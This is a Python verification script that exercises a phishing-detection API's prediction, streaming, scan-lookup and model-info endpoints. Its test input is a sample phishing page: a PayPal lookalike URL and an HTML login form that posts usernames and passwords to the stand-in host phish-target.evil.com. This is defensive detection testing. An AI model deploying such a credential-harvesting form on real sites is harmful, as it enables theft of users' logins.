import sys
import time

sys.path.insert(0, ".")

print("Loading modules...")
t0 = time.perf_counter()
from api.app import predict, predict_stream, get_scan_detail, model_info, get_threshold_analysis
from api.db import init_db
print(f"Loaded in {time.perf_counter() - t0:.2f}s")

def run_coro(coro):
    try:
        coro.send(None)
    except StopIteration as e:
        return e.value
    raise RuntimeError("Coroutine did not finish synchronously")

# 1. DB Init
print("\n--- 1. Testing DB Init ---")
init_db()
print("init_db() passed.")

# 2. Predict with URL + HTML
print("\n--- 2. Testing /predict with URL and HTML ---")
test_url = "https://secure-login.paypal.verify-accounts.com/update"
test_html = """
<html>
  <head><title>Verify Your Account</title></head>
  <body>
    <h1>Urgent: Verify Your PayPal Account</h1>
    <p>Please enter your credentials below immediately to prevent account suspension.</p>
    <form action="http://phish-target.evil.com/login" method="post">
      <input type="text" name="username" placeholder="Email / Username" />
      <input type="password" name="password" placeholder="Password" />
      <input type="submit" value="Log In" />
    </form>
  </body>
</html>
"""

t0 = time.perf_counter()
res = run_coro(predict(
    url=test_url,
    html=test_html,
    allow_fetch=False,
    screenshot=None,
    threshold=0.45,
    operating_point="balanced"
))
print(f"predict() finished in {time.perf_counter() - t0:.2f}s")
print(f"Scan ID: {res['scan_id']}")
print(f"Fused probability: {res['phishing_probability']}, Predicted label: {res['predicted_label']}")
print(f"Operating point: {res['operating_point']}, Needs review: {res['needs_review']}")
assert "explanations" in res, "explanations missing in /predict"
exps = res["explanations"]
assert "url" in exps and "html" in exps and "text" in exps
print("URL top 3 features (TreeSHAP):")
for f in exps["url"]["top_features"][:3]:
    print(f"  {f['feature']}: val={f['value']}, shap={f['shap_value']}, dir={f['direction']}")
print("HTML top 3 features (TreeSHAP):")
for f in exps["html"]["top_features"][:3]:
    print(f"  {f['feature']}: val={f['value']}, shap={f['shap_value']}, dir={f['direction']}")
print("Text top 3 n-grams (Linear Coefs):")
for f in exps["text"]["top_ngrams"][:3]:
    print(f"  '{f['ngram']}': tfidf={f['tfidf']}, coef={f['coefficient']}, dir={f['direction']}")

# 3. Scan Detail
print("\n--- 3. Testing GET /scans/{scan_id} ---")
detail = run_coro(get_scan_detail(res["scan_id"]))
assert detail.get("explanations") is not None, "Persisted explanations is None"
assert "url" in detail["explanations"]
print("Scan detail retrieved from SQLite with explanations successfully!")

# 4. Predict Stream
print("\n--- 4. Testing SSE /predict/stream ---")
stream_resp = run_coro(predict_stream(
    url=test_url,
    html=test_html,
    allow_fetch=False,
    screenshot=None,
    threshold=0.45,
    operating_point="balanced"
))
# body_iterator is an async generator: test iterating with anext / send
import json
events = []
agen = stream_resp.body_iterator

async def drain():
    async for chunk in agen:
        for line in chunk.split("\n\n"):
            line = line.strip()
            if line.startswith("data: "):
                events.append(json.loads(line[6:]))

# Manually advance the async generator without asyncio.run loop
try:
    while True:
        try:
            agen.asend(None).send(None)
        except StopIteration as e:
            chunk = e.value
            for line in chunk.split("\n\n"):
                line = line.strip()
                if line.startswith("data: "):
                    events.append(json.loads(line[6:]))
except (StopAsyncIteration, StopIteration):
    pass

stages = [e.get("stage") for e in events]
print(f"SSE stages emitted: {stages}")
assert events[-1].get("stage") == "done", "Last stage is not done"
assert "explanations" in events[-1], "explanations missing in done event"
print("Stream verified with explanations in done event!")

# 5. Model Info
print("\n--- 5. Testing GET /model-info ---")
mi = run_coro(model_info())
assert "global_feature_importance" in mi
gfi = mi["global_feature_importance"]
print(f"Global URL features: {len(gfi['url'])}, top: {gfi['url'][0]}")
print(f"Global HTML features: {len(gfi['html'])}, top: {gfi['html'][0]}")

# 6. Threshold Analysis
print("\n--- 6. Testing GET /threshold-analysis ---")
ta = run_coro(get_threshold_analysis())
assert "operating_points" in ta
print("Operating points in /threshold-analysis:", list(ta["operating_points"].keys()))

print("\n=======================================================")
print(">>> ALL PHASE A2 VERIFICATION TESTS PASSED 100%! <<<")
print("=======================================================")
